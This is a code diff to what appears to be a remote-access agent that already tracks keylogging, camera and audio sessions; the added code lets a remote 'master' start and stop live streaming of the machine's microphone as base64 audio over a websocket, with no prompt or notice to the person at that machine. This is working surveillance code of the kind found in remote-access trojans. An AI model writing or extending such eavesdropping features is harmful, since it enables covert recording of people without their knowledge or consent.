@@ -936,6 +936,8 @@ camera_sessions: dict[Any, dict] = {}
 keylog_sessions: dict[Any, Any] = {}
 # Audio sessions per master connection (agent microphone capture)
 audio_sessions: dict[Any, dict] = {}
+# Live listening sessions (agent microphone -> master dashboards audio stream) per master connection
+audio_listen_sessions: dict[Any, dict] = {}
 # Playback sessions per master connection (agent speaker playback of files/data)
 playback_sessions: dict[Any, dict] = {}
 # Intercom (master -> agent live audio) sessions per master connection
@@ -1162,6 +1164,86 @@ async def _connect_one_master(url: str):
                                     audio_sessions.pop(ws, None)
                                 except Exception:
                                     pass
+                            continue
+
+                        # --- Audio live listen (agent -> master streaming) ---
+                        if isinstance(data, dict) and data.get("type") == "audio_listen_start":
+                            if not AUDIO_ENABLED:
+                                try:
+                                    await ws.send(json.dumps({"error": "[Audio] Disabled on agent (AUDIO_ENABLED=0)\n"}))
+                                except Exception:
+                                    pass
+                                continue
+                            if ws in audio_listen_sessions and audio_listen_sessions[ws].get("running"):
+                                try:
+                                    await ws.send(json.dumps({"output": "[Audio listen already running]\n"}))
+                                except Exception:
+                                    pass
+                                continue
+                            try:
+                                req_rate = int(data.get("sample_rate") or data.get("rate") or 0)
+                            except Exception:
+                                req_rate = 0
+                            try:
+                                req_ch = int(data.get("channels") or 0)
+                            except Exception:
+                                req_ch = 0
+                            rate = max(8000, min(48000, int(req_rate or AUDIO_SAMPLE_RATE)))
+                            ch = 1 if int(req_ch or AUDIO_CHANNELS) <= 1 else 2
+                            stop_ev = threading.Event()
+                            import queue as _q
+                            q: _q.Queue[bytes] = _q.Queue()
+                            def _cb(indata, frames, t, status):
+                                try:
+                                    q.put_nowait(indata.copy().tobytes())
+                                except Exception:
+                                    pass
+                            def _thread_cap():
+                                try:
+                                    import sounddevice as sd  # type: ignore
+                                    with sd.InputStream(samplerate=rate, channels=ch, dtype='int16', callback=_cb):
+                                        while not stop_ev.is_set():
+                                            time.sleep(0.05)
+                                except Exception:
+                                    pass
+                            async def _sender_loop():
+                                try:
+                                    while not stop_ev.is_set():
+                                        try:
+                                            chunk = await asyncio.to_thread(q.get, True, 0.5)
+                                        except Exception:
+                                            chunk = None
+                                        if not chunk:
+                                            continue
+                                        try:
+                                            b64 = base64.b64encode(chunk).decode()
+                                            await ws.send(json.dumps({"type": "audio_live", "pcm_b64": b64, "rate": int(rate), "ch": int(ch), "ts": int(time.time()*1000)}))
+                                        except Exception:
+                                            break
+                                finally:
+                                    pass
+                            thr = threading.Thread(target=_thread_cap, daemon=True)
+                            thr.start()
+                            audio_listen_sessions[ws] = {"running": True, "stop": stop_ev, "thr": thr, "rate": rate, "ch": ch, "task": asyncio.create_task(_sender_loop())}
+                            await _send_line(ws, "output", f"[Audio listen] streaming... {rate}Hz ch={ch}\n")
+                            continue
+                        if isinstance(data, dict) and data.get("type") == "audio_listen_stop":
+                            sess = audio_listen_sessions.pop(ws, None)
+                            if sess:
+                                try:
+                                    sess.get("stop").set()
+                                except Exception:
+                                    pass
+                                try:
+                                    t = sess.get("task")
+                                    if t: t.cancel()
+                                except Exception:
+                                    pass
+                                try:
+                                    sess.get("thr").join(timeout=2.0)
+                                except Exception:
+                                    pass
+                                await _send_line(ws, "output", "[Audio listen] stopped\n")
                             continue
                         # --- Audio playback: play a file on agent speakers ---
                         if isinstance(data, dict) and data.get("type") == "audio_play_path":
